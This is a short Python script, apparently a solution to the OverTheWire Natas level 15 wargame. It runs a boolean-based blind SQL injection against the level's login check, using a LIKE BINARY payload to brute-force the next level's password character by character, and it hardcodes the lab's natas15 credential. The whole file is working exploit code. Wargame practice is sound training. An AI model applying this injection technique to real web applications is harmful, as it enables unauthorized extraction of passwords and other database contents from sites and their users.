#!/usr/bin/python3

import requests, sys

from string import digits, ascii_lowercase, ascii_uppercase

url = "http://natas15.natas.labs.overthewire.org/"

charset = ascii_lowercase + ascii_uppercase + digits

sqli = 'natas16" AND password LIKE BINARY "'

s = requests.Session()

#Hacemos la autenticación en el sitio

s.auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""

while len(password) < 32:
    for char in charset:
        r = s.post(url, data={'username': sqli + password + char + "%"})

        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break
